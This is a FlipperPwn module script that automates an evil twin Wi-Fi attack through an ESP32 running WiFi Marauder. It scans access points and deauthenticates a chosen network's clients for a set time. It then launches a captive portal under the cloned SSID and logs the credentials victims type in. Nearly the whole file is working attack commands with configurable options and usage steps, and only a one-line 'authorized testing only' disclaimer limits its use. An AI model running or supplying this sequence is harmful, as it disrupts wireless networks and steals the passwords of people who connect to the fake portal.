# FlipperPwn Module — Evil Twin Attack
# Full automated sequence: scan -> deauth target clients -> deploy captive portal.
#
# Structure note: FlipperPwn executes ONE platform section — the block matching
# the target OS, or the `PLATFORM ALL` block when there is no OS-specific one.
# The ESP32/Marauder commands here are OS-independent, and the on-target typing
# uses OS-aware commands (OPEN_NOTEPAD), so the whole module lives in a single
# `PLATFORM ALL` block (the same pattern as wifi_full_attack.fpwn). PRINT shows
# progress on the Flipper screen; it does not type on the target.
#
# REQUIREMENTS:
#   - ESP32 WiFi Dev Board running WiFi Marauder
#   - SD card on the ESP32 with your portal HTML at /portals/<file>
#   - AUTHORIZED TESTING ONLY
#
# USAGE:
#   1. Run WIFI_SCAN (e.g. via the WiFi menu) to learn AP index numbers
#   2. Set AP_INDEX to your target AP's index
#   3. Set PORTAL to the portal HTML filename staged on the ESP32 SD card
#   4. Execute this module
#
# Marauder command names/flags vary by firmware fork — adjust the WIFI_CMD lines
# to match the build flashed on your ESP32.

NAME        evil_twin
DESCRIPTION Scan APs, deauth target clients, deploy captive portal with cloned SSID
CATEGORY    credential
PLATFORMS   WIN,MAC,LINUX

OPTION AP_INDEX   0              "Target AP index from scanap (0-based)"
OPTION DEAUTH_SEC 30             "Seconds to run deauth before launching portal"
OPTION PORTAL     hotel_wifi.html "Evil Portal HTML filename on the ESP32 SD card"

PLATFORM ALL
IF_CONNECTED
  # ── Phase 1: Recon ──────────────────────────────────────────────────────
  PRINT Phase 1: Scanning APs...
  LED_COLOR BLUE
  WIFI_SCAN
  WIFI_WAIT 8000

  # ── Phase 2: Select target + deauth ─────────────────────────────────────
  # Marauder: select the AP by index, then deauth it to knock its clients off
  # so they re-associate through the evil twin.
  PRINT Phase 2: Deauth AP {{AP_INDEX}}...
  LED_COLOR RED
  WIFI_CMD select -a {{AP_INDEX}}
  WIFI_WAIT 500
  WIFI_CMD attack -t deauth
  WIFI_WAIT {{DEAUTH_SEC}}000
  WIFI_STOP

  # ── Phase 3: Evil twin portal ───────────────────────────────────────────
  # Stage the page on the ESP32 and start the captive portal cloning the SSID.
  # Marauder logs captured credentials to /logs/evil_portal.log on its SD card.
  PRINT Phase 3: Portal {{PORTAL}} active
  LED_COLOR MAGENTA
  WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
  WIFI_WAIT 500
  WIFI_CMD evilportal -c start

  # ── Phase 4: Report to target ───────────────────────────────────────────
  # Type the AP scan results onto the target for the tester's notes.
  LED_COLOR CYAN
  OPEN_NOTEPAD
  DELAY 1500
  STRINGLN === Evil Twin Active ===
  STRINGLN Target AP index: {{AP_INDEX}}   Portal: {{PORTAL}}
  STRINGLN Captured credentials appear on the Flipper screen + ESP32 SD log.
  STRINGLN
  STRINGLN --- AP scan ---
  WIFI_RESULT
  LED_COLOR GREEN
  PRINT Evil twin running — monitor Flipper for creds
END_IF
